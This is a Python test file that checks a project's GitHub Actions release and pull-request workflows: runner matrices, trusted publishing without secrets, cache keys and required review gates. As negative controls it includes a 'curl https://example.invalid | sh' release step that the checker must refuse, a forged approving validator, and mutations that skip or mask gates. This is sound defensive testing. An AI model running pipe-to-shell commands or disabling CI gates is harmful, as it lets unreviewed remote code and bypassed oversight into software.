    assert [row.get("root") for row in rows if row["group"] == "lint"] == ["."]
    assert sorted(row["runner"] for row in rows if row["group"] == "check") == sorted(
        ["ubuntu-26.04", "ubuntu-26.04-arm", "macos-26", "windows-2025"]
    )
    assert [row["runner"] for row in rows if row["group"] == "api"] == ["macos-26"]
    # The tests on every machine the products ship to; every other group once, on Linux.
    assert sorted(row["runner"] for row in rows if row["group"] == "release-tests") == sorted(
        ["ubuntu-26.04", "ubuntu-26.04-arm", "macos-26", "windows-2025"]
    )
    assert all(row["runner"] == "ubuntu-26.04" for row in rows if row["group"] not in {"release-tests", "check", "api"})
    assert len(rows) == len({(row["runner"], row["group"]) for row in rows})
    (uploading,) = [step for step in publish["steps"] if "CARGO_REGISTRY_TOKEN" in step.get("env", {})]
    # Trusted publishing only: crates.io's token is the one its auth action exchanged, and no step reads a secret.
    assert uploading["env"]["CARGO_REGISTRY_TOKEN"] == "${{ env.PUBLISH == 'true' && steps.crates-io.outputs.token || '' }}"
    (auth,) = [step for step in publish["steps"] if step.get("uses", "").startswith("rust-lang/crates-io-auth-action@")]
    assert auth["if"] == "env.PUBLISH == 'true'"
    assert "secrets." not in (DIRECTORY / "release.yml").read_text()
    assert publish["permissions"]["id-token"] == "write"
    # npm's trusted publishing needs npm 11.5.1 or later, which the latest Node 24 bundles.
    (node,) = [step for step in publish["steps"] if step.get("uses", "").startswith("actions/setup-node@")]
    assert node["with"]["node-version"] == 24 and node["with"]["check-latest"] is True
    (release,) = [step for step in publish["steps"] if step.get("name") == RELEASE_STEP]
    assert release["if"] == "env.PUBLISH == 'true'"


def test_the_release_builds_every_target_in_one_matrix_whose_rows_run_the_same_steps() -> None:
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    build = workflow["jobs"]["build"]
    assert build["strategy"]["fail-fast"] is False
    assert [row["target"] for row in build["strategy"]["matrix"]["platform"]] == [
        "x86_64-unknown-linux-gnu",
        "aarch64-unknown-linux-gnu",
        "x86_64-unknown-linux-musl",
        "aarch64-unknown-linux-musl",
        "x86_64-apple-darwin",
        "aarch64-apple-darwin",
        "x86_64-pc-windows-msvc",
        "aarch64-pc-windows-msvc",
    ]
    assert [step["uses"].split("@")[0] for step in build["steps"]] == [
        "actions/checkout",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "actions/upload-artifact",
    ]
    # Every shipped product's binary, for its GitHub Release: the wheel of its PyPI project, or of its command line crate when it
    # ships to Cargo alone.
    built = {step["with"]["working-directory"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert built == {
        "crates/asymptote/distribution/registries/pypi",
        "crates/ryo/cli",
        "crates/tastemaker/distribution/registries/pypi",
    }
    # A row builds only its product, one of the products the run releases.
    building = {step["with"]["working-directory"]: step["if"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert {directory: condition.split("'")[1] for directory, condition in building.items()} == {
        "crates/asymptote/distribution/registries/pypi": "asymptote",
        "crates/ryo/cli": "ryo",
        "crates/tastemaker/distribution/registries/pypi": "tastemaker",
    }
    assert workflow["jobs"]["publish"]["needs"] == ["tag", "build"]
    released = "${{ fromJSON(github.event_name == 'push' && needs.tag.outputs.products || format('[\"{0}\"]', inputs.product)) }}"
    assert build["strategy"]["matrix"]["product"] == workflow["jobs"]["publish"]["strategy"]["matrix"]["product"] == released


def test_a_job_that_releases_with_anything_but_gh_is_refused() -> None:
    publish = job("uv run ci/release/command.py --publish", needs="check")
    publish["steps"].append({"name": RELEASE_STEP, "run": "gh release create v1\ncurl https://example.invalid | sh"})
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish releases with 'curl https://example.invalid | sh'"
    ]


def test_speed_requires_declared_timings_for_every_language_workspace_member() -> None:
    """A source-registry omission cannot hide behind equal observed base/head metric sets."""
    tools = tomllib.loads((ROOT / "asymptote.toml").read_text())["tools"]
    speed = next(tool for tool in tools if tool["id"] == "speed")
    bench_names = [speed["run"][index + 1] for index, value in enumerate(speed["run"]) if value == "--bench"]
    assert "languages" in bench_names
    for manifest in sorted((ROOT / "crates/ryo/languages").glob("*/Cargo.toml")):
        language = tomllib.loads(manifest.read_text())
        contract = language["package"]["metadata"]["ryo"]["performance"]
        assert contract == {"schema": "divan-timing/v1", "workloads": {"generated_every_relation": [2500, 10000]}, "metrics": ["median-ns"]}

def test_a_push_to_main_releases_the_products_whose_version_it_changes_without_checking_again() -> None:
    """The pull request gate checked the tree a push to main brings, so the push tags and releases each product whose version it
    changes, and only those, each product's publish in a concurrency group of its own; a hand run checks its product first."""
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    on = workflow["on" if "on" in workflow else True]
    assert on["push"] == {"branches": ["main"]} and set(on["workflow_dispatch"]["inputs"]) == {"product", "publish"}
    jobs = workflow["jobs"]
    assert "concurrency" not in workflow
    tag = jobs["tag"]
    assert tag["if"] == "github.event_name == 'push'" and tag["permissions"] == {"contents": "write"}
    assert [step["run"] for step in tag["steps"] if "run" in step] == ["uv run ci/tag/command.py --push"]
    assert tag["outputs"]["products"] == "${{ steps.tag.outputs.products }}"
    assert jobs["check"]["if"] == "github.event_name == 'workflow_dispatch'"
    assert jobs["build"]["needs"] == ["tag", "check"]
    assert jobs["build"]["if"].startswith("${{ !cancelled() && !failure() && ")
    assert "needs.tag.outputs.products != '[]'" in jobs["build"]["if"]
    publish = jobs["publish"]
    assert publish["if"] == "${{ !cancelled() && needs.build.result == 'success' }}"
    assert publish["concurrency"] == {"group": "release-${{ matrix.product }}", "cancel-in-progress": False}
    # One publish at a time, in the `tag` job's order: ryo's crates are on crates.io before tastemaker's publish starts.
    assert publish["strategy"]["max-parallel"] == 1
    assert PRODUCTS.index("ryo") < PRODUCTS.index("tastemaker")
    # Each build row's artifact is named for its product, and a publish downloads its product's alone, a directory per target.
    (upload,) = [step for step in jobs["build"]["steps"] if step["uses"].startswith("actions/upload-artifact@")]
    assert upload["with"]["name"] == "${{ matrix.product }}-${{ matrix.platform.target }}"
    (download,) = [step for step in publish["steps"] if step.get("uses", "").startswith("actions/download-artifact@")]
    assert download["with"] == {"pattern": "${{ matrix.product }}-*", "merge-multiple": True, "path": "dist"}


def test_a_pull_request_runs_each_changed_product_s_check_fan_out_behind_one_gate() -> None:
    """For each product a pull request to main changes, its whole check fan-out, the rows release.yml checks a hand run with; a
    change outside the products is every product's and the root's check group (the ci/ tests) too, and every pull request the
    root's lint group (its commit messages and title among them). A hand run checks the one product it names, and no root. One
    `gate` job, which branch protection requires, fails when a job failed or was cancelled and passes when each succeeded or was
    skipped."""
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    on = workflow["on" if "on" in workflow else True]
    assert set(on) == {"pull_request", "workflow_dispatch"} and on["pull_request"] == {"branches": ["main"]}
    assert on["workflow_dispatch"]["inputs"] == {
        "product": {
            "description": "The one product this run checks",
            "type": "choice",
            "required": True,
            "options": list(PRODUCTS),
        }
    }
    assert workflow["concurrency"] == {"group": "check-${{ github.event.pull_request.number || github.ref }}", "cancel-in-progress": True}
    jobs = workflow["jobs"]
    assert set(jobs) == {"changes", "root", "check", "gate", "speed", "ruff-candidates", "ruff-all-defaults", "contract-review"}
    (filter,) = jobs["changes"]["steps"]
    assert filter["uses"].startswith("dorny/paths-filter@") and filter["with"]["predicate-quantifier"] == "some-with-excludes"
    filters = yaml.safe_load(filter["with"]["filters"])
    products = ["ryo", "tastemaker", "asymptote"]
    assert {name: filters[name] for name in products} == {name: f"crates/{name}/**" for name in products}
    assert filters["repository"] == ["**"] + [f"!crates/{name}/**" for name in products]
    assert sorted(path.parent.name for path in ROOT.glob("crates/*/Cargo.toml")) == sorted(products)
    outputs = jobs["changes"]["outputs"]
    assert outputs["products"] == (
        "${{ github.event_name != 'pull_request' && format('[\"{0}\"]', inputs.product) || "
        "(steps.filter.outputs.repository == 'true' && '[\"ryo\",\"tastemaker\",\"asymptote\"]' || steps.filter.outputs.changes) }}"
    )
    assert outputs["repository"] == "${{ github.event_name == 'pull_request' && steps.filter.outputs.repository == 'true' }}"
    assert jobs["root"]["if"] == "github.event_name == 'pull_request'"
    (rooted,) = [step["run"] for step in jobs["root"]["steps"] if "asymptote check" in step.get("run", "")]
    assert rooted == "asymptote check --root . --groups ${{ needs.changes.outputs.repository == 'true' && 'lint,check' || 'lint' }}"
    # The root's lint group checks a pull request's title with its commitizen tool.
    (commitizen,) = [tool for tool in tomllib.loads((ROOT / "asymptote.toml").read_text())["tools"] if tool["id"] == "commitizen"]
    assert commitizen["group"] == "lint"
    assert 'cz check --message "$(jq -r .pull_request.title "$GITHUB_EVENT_PATH")"' in commitizen["run"][-1]
    check = jobs["check"]
    assert check["needs"] == "changes" and check["if"] == "needs.changes.outputs.products != '[]'"
    assert check["strategy"]["matrix"]["product"] == "${{ fromJSON(needs.changes.outputs.products) }}"
    (checking,) = [step["run"] for step in check["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root crates/${{ matrix.product }} --groups ${{ matrix.check.group }}"
    release = yaml.safe_load((DIRECTORY / "release.yml").read_text())["jobs"]["check"]["strategy"]["matrix"]["include"]
    assert check["strategy"]["matrix"]["check"] == [{"runner": row["runner"], "group": row["group"]} for row in release]
    # The same caches as the release's check: per machine, group and product, and the installed tools.
    (cache,) = [step for step in check["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@")]
    assert cache["with"]["shared-key"] == "${{ matrix.check.runner }}-${{ matrix.check.group }}-${{ matrix.product }}"
    (released,) = [step for step in release_check()["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@")]
    assert released["with"]["shared-key"] == "${{ matrix.runner }}-${{ matrix.group }}-${{ inputs.product }}"
    for name in ("root", "check"):
        defined = jobs[name]
        assert [step["uses"].split("@")[0] for step in defined["steps"] if "uses" in step] == [
            step["uses"].split("@")[0] for step in release_check()["steps"] if "uses" in step
        ]
    gate = jobs["gate"]
    assert gate["if"] == "always()" and gate["needs"] == ["changes", "root", "check", "speed", "ruff-candidates", "contract-review"]
    (deciding,) = gate["steps"]
    assert deciding["uses"].startswith("re-actors/")
    assert deciding["with"] == {"jobs": "${{ toJSON(needs) }}", "allowed-skips": "root, check, ruff-candidates"}


def ruff_candidates_covered(workflow: dict) -> bool:
    """The authored Ruff subset has a real Linux runner and a required gate edge."""
    jobs = workflow["jobs"]
    job = jobs.get("ruff-candidates")
    if job is None:
        return False
    return (
        job.get("needs") == "changes"
        and job.get("if") == "contains(fromJSON(needs.changes.outputs.products), 'ryo')"
        and job.get("runs-on") == "ubuntu-26.04"
        and [step["run"] for step in job["steps"] if "asymptote check" in step.get("run", "")]
        == ["asymptote check --root crates/ryo --groups ruff-candidates"]
        and "ruff-candidates" in jobs["gate"]["needs"]
        and "ruff-candidates" in jobs["gate"]["steps"][0]["with"]["allowed-skips"].split(", ")
    )


def test_ruff_authoring_guard_cannot_be_orphaned_by_product_selection() -> None:
    tools = tomllib.loads((ROOT / "crates/ryo/asymptote.toml").read_text())["tools"]
    assert any(tool["id"] == "correctness-python-ruff-candidates" and tool["group"] == "ruff-candidates" for tool in tools)
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    assert ruff_candidates_covered(workflow)
    missing = deepcopy(workflow)
    missing["jobs"].pop("ruff-candidates")
    detached = deepcopy(workflow)
    detached["jobs"]["gate"]["needs"].remove("ruff-candidates")
    skipped = deepcopy(workflow)
    skipped["jobs"]["ruff-candidates"]["if"] = "false"
    wrong_group = deepcopy(workflow)
    command = next(step for step in wrong_group["jobs"]["ruff-candidates"]["steps"] if "asymptote check" in step.get("run", ""))
    command["run"] = "asymptote check --root crates/ryo --groups check"
    assert all(not ruff_candidates_covered(changed) for changed in (missing, detached, skipped, wrong_group))


def test_rust_build_caches_keep_each_product_and_profile_separate() -> None:
    def one_workspace(cache: dict, source: str) -> bool:
        return cache.get("workspaces", "").splitlines() == [f"{source} -> ../../target"]

    jobs = yaml.safe_load((DIRECTORY / "check.yml").read_text())["jobs"]
    keys = set()
    for name in ("check", "speed", "ruff-candidates", "ruff-all-defaults"):
        cache = next(step for step in jobs[name]["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@"))["with"]
        assert "prefix-key" not in cache
        assert cache["cache-workspace-crates"] is True
        assert one_workspace(cache, "crates/${{ matrix.product }}" if name == "check" else "crates/ryo")
        assert cache["save-if"] is True and cache["cache-on-failure"] is True
        assert cache["shared-key"] == (
            "${{ matrix.check.runner }}-${{ matrix.check.group }}-${{ matrix.product }}" if name == "check"
            else f"ubuntu-26.04-{name}-ryo"
        )
        keys.add(cache["shared-key"])
    assert len(keys) == 4
    duplicate_target = deepcopy(cache)
    duplicate_target["workspaces"] += "\ncrates/asymptote -> ../../target"
    assert not one_workspace(duplicate_target, "crates/ryo")
    release = next(step for step in release_check()["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@"))["with"]
    assert "prefix-key" not in release
    assert release["cache-workspace-crates"] is True
    assert one_workspace(release, "crates/${{ inputs.product }}")
    assert release["shared-key"] == "${{ matrix.runner }}-${{ matrix.group }}-${{ inputs.product }}"


def release_check() -> dict:
    """release.yml's check job, whose steps the pull request gate's checking jobs repeat."""
    return yaml.safe_load((DIRECTORY / "release.yml").read_text())["jobs"]["check"]


def test_a_hand_run_opens_one_product_s_release_pull_request_after_its_lint_and_starts_its_check() -> None:
    """The release pull request workflow starts only by hand, for the one product its input names: the product's lint group, then
    the one job command that opens the pull request with release-plz and starts check.yml on its branch, with the workflow's own
    token and the permissions that takes alone."""
    workflow = yaml.safe_load((DIRECTORY / "release-pr.yml").read_text())
    on = workflow["on" if "on" in workflow else True]
    assert set(on) == {"workflow_dispatch"}
    (product,) = on["workflow_dispatch"]["inputs"].values()
    assert product["type"] == "choice" and product["required"] is True and product["options"] == list(PRODUCTS)
    assert workflow["permissions"] == {"contents": "read"}
    jobs = workflow["jobs"]
    assert set(jobs) == {"check", "release_pr"}
    (checking,) = [step["run"] for step in jobs["check"]["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root crates/${{ inputs.product }} --groups lint"
    release_pr = jobs["release_pr"]
    assert release_pr["needs"] == "check"
    assert release_pr["permissions"] == {"contents": "write", "pull-requests": "write", "actions": "write"}
    (command,) = [step for step in release_pr["steps"] if "ci/release_pr/command.py" in step.get("run", "")]
    assert command["run"] == "uv run ci/release_pr/command.py --product ${{ inputs.product }}"
    assert command["env"] == {"GH_TOKEN": "${{ github.token }}"}
    assert "secrets." not in (DIRECTORY / "release-pr.yml").read_text()
    # release-plz opens the pull request alone: no publish, no tag and no GitHub Release, for every product.
    for name in PRODUCTS:
        configuration = tomllib.loads((ROOT / "crates" / name / "release-plz.toml").read_text())["workspace"]
        assert {key: configuration[key] for key in ("publish", "git_tag_enable", "git_release_enable")} == {
            "publish": False,
            "git_tag_enable": False,
            "git_release_enable": False,
        }
        assert configuration["pr_name"] == f"chore({name}): release {{{{ version }}}}"


CONTRACT_REVIEW_SCRIPT = 'policy_revision=763a846f1f17af7d6a503874524b7a33adf56e73\nif git cat-file -e "$REVIEW_BASE:ci/contract_review/service.py" 2>/dev/null; then\n  policy_revision=$REVIEW_BASE\nfi\nreview_policy=$(mktemp -d)\ntrap \'rm -rf "$review_policy"\' EXIT\nmkdir -p "$review_policy/ci/contract_review"\nfor file in command.py service.py; do\n  git show "$policy_revision:ci/contract_review/$file" > "$review_policy/ci/contract_review/$file"\ndone\npython3 -I "$review_policy/ci/contract_review/command.py" --root "$GITHUB_WORKSPACE"\n'


def contract_review_problems(workflow: dict) -> list[str]:
    """Reject an orphaned, conditional, replaced, or failure-masked review gate."""
    jobs = workflow["jobs"]
    expected = {
        "runs-on": "ubuntu-26.04",
        "steps": [
            {"uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "with": {"fetch-depth": 0, "persist-credentials": False}},
            {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
            {"name": "Require exact-source Astra and Opus reviews", "env": {"REVIEW_BASE": "${{ github.event.pull_request.base.sha || format('refs/remotes/origin/{0}', github.event.repository.default_branch) }}"}, "run": CONTRACT_REVIEW_SCRIPT},
        ],
    }
    gate = jobs.get("gate", {})
    allowed = gate.get("steps", [{}])[0].get("with", {}).get("allowed-skips", "")
    if jobs.get("contract-review") != expected or "contract-review" not in needs(gate) or "contract-review" in allowed:
        return ["paired contract review must run unconditionally and be required by gate"]
    return []


def test_contract_review_is_required_and_cannot_skip_or_mask_failures() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    assert not contract_review_problems(workflow)
    for mutate in (
        lambda w: w["jobs"].pop("contract-review"),
        lambda w: w["jobs"]["gate"]["needs"].remove("contract-review"),
        lambda w: w["jobs"]["contract-review"].update({"if": "false"}),
        lambda w: w["jobs"]["contract-review"].update({"continue-on-error": True}),
        lambda w: w["jobs"]["contract-review"]["steps"][-1].update({"run": "true"}),
        lambda w: w["jobs"]["contract-review"]["steps"][-1].update({"if": "false"}),
        lambda w: w["jobs"]["contract-review"]["steps"][0]["with"].update({"ref": "main"}),
        lambda w: w["jobs"]["gate"]["steps"][0]["with"].update({"allowed-skips": "contract-review"}),
    ):
        changed = deepcopy(workflow)
        mutate(changed)
        assert contract_review_problems(changed)


def ownership_gate_problems(workflow: dict) -> list[str]:
    jobs = workflow["jobs"]
    expected = {
        "runs-on": "ubuntu-26.04",
        "steps": [
            {"uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "with": {"fetch-depth": 0, "persist-credentials": False}},
            {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
            {"name": "Require every matrix contract and executed control", "run": 'python3 -I ci/scripts/checks/ownership_matrix.py --root "$GITHUB_WORKSPACE"'},
        ],
    }
    gate = jobs.get("gate", {})
    allowed = gate.get("steps", [{}])[0].get("with", {}).get("allowed-skips", "")
    if jobs.get("ownership-contracts") != expected or "ownership-contracts" not in needs(gate) or "ownership-contracts" in allowed:
        return ["ownership matrix gate must run unconditionally and be required by gate"]
    return []


def test_ownership_matrix_gate_is_required_and_cannot_be_masked() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    assert not ownership_gate_problems(workflow)
    for mutate in (
        lambda w: w["jobs"].pop("ownership-contracts"),
        lambda w: w["jobs"]["gate"]["needs"].remove("ownership-contracts"),
        lambda w: w["jobs"]["ownership-contracts"].update({"continue-on-error": True}),
        lambda w: w["jobs"]["ownership-contracts"]["steps"][-1].update({"run": "true"}),
        lambda w: w["jobs"]["gate"]["steps"][0]["with"].update({"allowed-skips": "ownership-contracts"}),
    ):
        changed = deepcopy(workflow)
        mutate(changed)
        assert ownership_gate_problems(changed)


@pytest.mark.parametrize("dispatch", [False, True])
def test_ci_executes_trusted_policy_when_candidate_validator_returns_success(tmp_path: Path, dispatch: bool) -> None:
    import os
    import subprocess
    from ci.contract_review import service

    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    objects = service.git(ROOT, "rev-parse", "--path-format=absolute", "--git-path", "objects").decode().strip()
    (tmp_path / ".git/objects/info/alternates").write_text(objects + "\n")
    service.git(tmp_path, "read-tree", service.ACTIVATION)
    candidate = b"print('forged approval')\n"
    blob = subprocess.check_output(["git", "-C", str(tmp_path), "hash-object", "-w", "--stdin"], input=candidate).decode().strip()
    service.git(tmp_path, "update-index", "--add", "--cacheinfo", f"100644,{blob},ci/contract_review/command.py")
    forged_service = subprocess.check_output(["git", "-C", str(tmp_path), "hash-object", "-w", "--stdin"], input=b"def validate(*args): return 'forged approval'\n").decode().strip()
    service.git(tmp_path, "update-index", "--add", "--cacheinfo", f"100644,{forged_service},ci/contract_review/service.py")
    module = b"raise RuntimeError('candidate package must not run')\n"
    module_blob = subprocess.check_output(["git", "-C", str(tmp_path), "hash-object", "-w", "--stdin"], input=module).decode().strip()
    service.git(tmp_path, "update-index", "--add", "--cacheinfo", f"100644,{module_blob},ci/__init__.py")
    tree = service.git(tmp_path, "write-tree").decode().strip()
    env = dict(os.environ, GIT_AUTHOR_NAME="Control", GIT_AUTHOR_EMAIL="test@example.invalid", GIT_COMMITTER_NAME="Control", GIT_COMMITTER_EMAIL="test@example.invalid")
    head = subprocess.check_output(["git", "-C", str(tmp_path), "commit-tree", tree, "-p", service.ACTIVATION], input=b"hostile validator control\n", env=env).decode().strip()
    service.git(tmp_path, "reset", "--hard", head)
    # The candidate's own entry point lies; the actual CI shell ignores it.
    own = subprocess.run(["python3", "ci/contract_review/command.py"], cwd=tmp_path, capture_output=True)
    assert own.returncode == 0 and b"forged approval" in own.stdout
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    script = workflow["jobs"]["contract-review"]["steps"][-1]["run"]
    service.git(tmp_path, "update-ref", "refs/remotes/origin/main", service.ACTIVATION)
    review_base = "refs/remotes/origin/main" if dispatch else service.ACTIVATION
    result = subprocess.run(["bash", "-e", "-c", script], cwd=tmp_path, env={**env, "PYTHONPATH": str(tmp_path), "REVIEW_BASE": review_base, "GITHUB_WORKSPACE": str(tmp_path)}, capture_output=True, text=True)
    assert result.returncode == 1
    assert "No valid exact-source" in result.stderr
    assert "candidate package must not run" not in result.stderr
